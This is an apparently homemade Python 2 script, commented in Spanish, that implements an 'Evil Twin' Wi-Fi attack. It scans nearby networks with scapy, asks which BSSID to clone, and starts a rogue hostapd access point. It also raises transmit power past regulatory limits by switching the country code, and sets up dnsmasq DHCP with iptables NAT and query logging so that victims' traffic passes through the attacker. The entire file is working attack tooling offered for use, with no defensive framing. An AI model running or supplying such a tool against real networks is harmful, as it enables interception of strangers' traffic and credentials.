#!/usr/bin/env python
# -*- encoding: utf-8 -*-

import argparse
import subprocess
from multiprocessing import Process
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import sys, os, signal
import threading
import netifaces

channel_list = []
essid_list = []
bssid_list = []
enc_list = []
networks = {} # dictionary to store APs
interface_list = [] # Lista para interfaces
# Beacons and ProbeResponses.
def sniffAP(p):
    if ( (p.haslayer(Dot11Beacon) or p.haslayer(Dot11ProbeResp))
                 and not networks.has_key(p[Dot11].addr3)):
        essid      = p[Dot11Elt].info if '\x00' not in p[Dot11Elt].info and p[Dot11Elt].info != '' else 'ESSID Oculto'
        bssid      = p[Dot11].addr3
        channel    = int( ord(p[Dot11Elt:3].info))
        pa = p[Dot11Elt]
        cap = p.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}"
                      "{Dot11ProbeResp:%Dot11ProbeResp.cap%}").split('+')
        crypto = set()
        while isinstance(pa, Dot11Elt):
            if pa.ID == 48:
                crypto.add("WPA2")
            elif pa.ID == 221 and pa.info.startswith('\x00P\xf2\x01\x01\x00'):
                crypto.add("WPA")
            pa = pa.payload
        if not crypto:
            if 'privacy' in cap:
                crypto.add("WEP")
            else:
                crypto.add("OPN")
        enc = '/'.join(crypto)
        if bssid not in networks:
            networks[bssid] = ( essid, channel, enc )
            channel_list.append(channel)
            essid_list.append(essid)
            bssid_list.append(bssid)
            enc_list.append(enc)
            # Imprime cada que encuentra una nueva red
            print "{0:3}\t{1:10}\t{2:20}\t{3:20}".format(int(channel), enc, bssid, essid)

def sniff_process(interface):
    # Imprimir cabecera del escaneo
    print "\nEl escaneo terminara el 15 segundos u oprime CTRL + C"
    print "{0:3}\t{1:10}\t{2:20}\t{3:20}".format('CH','ENC','BSSID','SSID')
    # Ininicamos el Sniffer
    sniff(iface=interface,prn=sniffAP,timeout=15)

def clean_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def chose_iface(interface):
    # Listar interfaces disponibles
    interface_list = netifaces.interfaces()
    print "======= Interfaces disponibles =======\n"
    for i, interface in enumerate(interface_list):
        print "\t%02d: %s" %(i, str(interface))
    target_interface = raw_input('\nIntroduce la interface a utilizar en modo monitor ')
    while target_interface not in interface_list:
        target_interface = raw_input('Interface no se encuentra... Por favor introduce otro: ')
    # Cambiamos interfaz a modo: Monitor
    print 'Cambiando interface ' + target_interface + ' a modo monitor '
    return target_interface

def monitor_iface(target_interface):
    os.system("airmon-ng start %s 1>/dev/null" % (target_interface))
    interface = str(target_interface)+'mon'
    return interface

def iface_txpower(interface,args):
    # Cambiar potencia de antena
    if args.mode == "interactivo":
        target_txpower = raw_input('\n¿Deseas incrementar la potencia de tu antena a 30dB? (s/n)')
        if target_txpower == 's':
            os.system("ifconfig %s down" % (interface))
            os.system("iw reg set GY") #GY o BO
            os.system("ifconfig %s up" % (interface))
            os.system("iwconfig %s txpower 30" % (interface))
        elif target_txpower == 'n':
            pass
    if args.txpower != None and args.mode != "interactivo":
        os.system("ifconfig %s down" % (interface))
        os.system("iw reg set GY") #GY o BO
        os.system("ifconfig %s up" % (interface))
        os.system("iwconfig %s txpower %s" % (interface,str(args.txpower)))

def run_dnsmasq(interface,first_ip,last_ip,mask,gateway):
    # Colocamos la informacion que ira en el archivo de configuracion dnsmasq.conf
    dnsmasq_text = ['interface='+interface,
                    'dhcp-range='+first_ip+','+last_ip+','+mask+','+'12m',
                    'dhcp-option=3,'+gateway,
                    'dhcp-option=6,'+gateway,
                    'server=8.8.8.8',
                    'server=8.8.4.4',
                    'log-queries',
                    'log-dhcp',
                    'listen-address=127.0.0.1'
                    ]
    # Crear archivo dnsmasq.conf
    outF = open("dnsmasq.conf", "w")
    for line in dnsmasq_text:
      # Escribimos cada linea en nuestro archivo de configuracion
      outF.write(line)
      outF.write("\n")
    outF.close()

    # Creamos DHCP con dnsmasq
    gateway_dhcp = ['ifconfig '+interface+' '+gateway+' netmask '+mask,
                    'iptables --flush',
                    'iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE',
                    'iptables --append FORWARD --in-interface '+interface+' -j ACCEPT',
                    'echo 1 > /proc/sys/net/ipv4/ip_forward'
                    ]
    # Creamos el archivo con la configuracion de la intefaz wlan0mon y el dhcp
    outF = open("conf_gateway_dhcp.txt", "w")
    for line in gateway_dhcp:
      # Escribimos cada linea en nuestro archivo de configuracion
      outF.write(line)
      outF.write("\n")
    outF.close()
    # Leemos el archivo y ejecutamos cada instruccion
    outF = open("conf_gateway_dhcp.txt", "r")
    lines = outF.readlines()
    for line in lines:
      # Ejecutamos cada linea en el archivo.
      os.system(line)
    outF.close()
    # Subproceso
    p = subprocess.Popen(["xterm", "-e", "dnsmasq", "-C", "./dnsmasq.conf", "-d"])

def conf_dnsmasq(args,interface,first_ip,last_ip,mask,gateway):
    dnsmasq_text = []
    if args.mode == "interactivo":
        net_opts = {'1': ('192.168.1.10', '192.168.1.254', '255.255.255.0', '192.168.1.1'), '2': ('10.0.0.10', '10.0.0.254', '255.255.255.0', '10.0.0.1')}
        print "======= Configuracion de Red Disponible =======\n\t1. 192.168.1.0/24\n\t2. 10.0.0.0/24"
        target_network = raw_input('Elige una opcion: ')
        while target_network not in net_opts:
            target_network = raw_input('El numero de red que escogiste es incorrecto, intenta de nuevo: ')
        # Configuramos cada parametro con la opcion elegida
        first_ip = net_opts[target_network][0]
        last_ip  = net_opts[target_network][1]
        mask     = net_opts[target_network][2]
        gateway  = net_opts[target_network][3]
        run_dnsmasq(interface,first_ip,last_ip,mask,gateway)
    else:
        run_dnsmasq(interface,first_ip,last_ip,mask,gateway)
        pass

def run_rogueAP(interface,channel):
    hostapd_text = ['interface='+interface,
                  'driver=nl80211',
                  'ssid=Fake_AP',
                  'hw_mode=g',
                  'channel='+channel,
                  'macaddr_acl=0',
                  'ignore_broadcast_ssid=0'
                 ]
    # Crear archivo hostapd.conf
    outF = open("hostapd.conf", "w")
    for line in hostapd_text:
      # write line to output file
      outF.write(line)
      outF.write("\n")
    outF.close()
    # Subproceso
    p = subprocess.Popen(["xterm", "-e", "hostapd", "./hostapd.conf"])

def rogueAP(interface,channel):
    channels = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15']
    if args.mode == "interactivo":
        target_channel = raw_input('Selecciona el canal en el que trabajara RougeAP [1-15]: ')
        while target_channel not in channels:
            target_channel = raw_input('Canal incorrecto, intenta de nuevo: ')
        run_rogueAP(interface,target_channel)
    else:
        pass

def use_mode(args):
    if args.mode == "interactivo" or args.mode == "file":
        interface = None
        bssid     = None
        essid     = None
        channel   = None
        txpower   = None
        first_ip  = None
        last_ip   = None
        mask      = None
        gateway   = None
        if args.mode == "interactivo":
            # Listamos interfaces
            target_interface = chose_iface(interface)
            #Cambiamos a modo: Monitor
            interface = monitor_iface(target_interface)
            # Cambair la potencia de la antena.
            iface_txpower(interface,args)
            # Proceso de sniffer para redes WIFI
            sniff_process(interface)
            # Limpiamos la terninal antes de mostrar los resultados
            clean_screen()
            # Mostramos redes disponibles
            print "======= Redes Inalambricas Disponibles =======\n"
            print "{0:3}\t{1:5}\t{2:28}\t{3:20}\t{4:5}".format('ID', 'Canal', 'ESSID', 'BSSID', 'ENC')
            for i in range(len(essid_list)):
                print "{0:3}\t{1:5}\t{2:28}\t{3:20}\t{4:5}".format(i, channel_list[i], essid_list[i], bssid_list[i], enc_list[i])
            target_bssid = raw_input('Introduce el BSSID de la red Wifi a clonar: ')
            while target_bssid not in networks:
                raw_input('BSSID no se encuentra... Por favor introduce otro: ')
            # Llamamos a la funcion rogueAP() para crear nuestro RogueAP
            rogueAP(interface,channel)
            # Llamamos a la funcio conf_dnsmasq() para crear DHCP que usara RogueAP
            conf_dnsmasq(args,interface,first_ip,last_ip,mask,gateway)

        if args.mode == "file":
            pass
    elif args.mode == "args":
        interface = args.interface
        bssid     = args.bssid
        essid     = args.essid
        channel   = args.channel
        txpower   = args.txpower
        first_ip  = args.first_ip
        last_ip   = args.last_ip
        mask      = args.mask
        gateway   = args.gateway
    else:
        print "\nElige un modo de uso corecto:\n\t[interactivo, args , file]"
    return interface,bssid,essid,channel,txpower,first_ip,last_ip,mask,gateway

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Implementacion de Evil Twin Attack')
    parser.add_argument('-mode' , '--use-mode'  , dest='mode'      , type=str, required=True,  choices=['interactivo','args','file'] ,help='Modo de uso del programa: Interactivo, Argumentos, Archivo')
    parser.add_argument('-i'    , '--interface' , dest='interface' , type=str, required=False, help='Interface to use for sniffing and packet injection')
    parser.add_argument('-bssid', '--bssid'     , dest='bssid'     , type=str, required=False, help='Direccion MAC del AP')
    parser.add_argument('-essid', '--essid'     , dest='essid'     , type=str, required=False, help='Nombre de la red inalambrica')
    parser.add_argument('-c'    , '--channel'   , dest='channel'   , type=int, required=False, choices=range(1,16) ,help='Canal del AP ')
    parser.add_argument('-p'    , '--txpower'   , dest='txpower'   , type=int, required=False, choices=range(20,31,10), help='Potencia de la antena')
    parser.add_argument('-f_ip' , '--first_ip'  , dest='first_ip'  , type=str, required=False, help='Primer IP del pool DHCP')
    parser.add_argument('-l_ip' , '--last_ip'   , dest='last_ip'   , type=str, required=False, help='Ultima IP del pool DHCP')
    parser.add_argument('-m'    , '--mask'      , dest='mask'      , type=str, required=False, help='Mascara')
    parser.add_argument('-g'    , '--gateway'   , dest='gateway'   , type=str, required=False, help='Gateway')

    args = parser.parse_args()
    use_mode(args)
    #os.system('airmon-ng stop %s' %(interface))
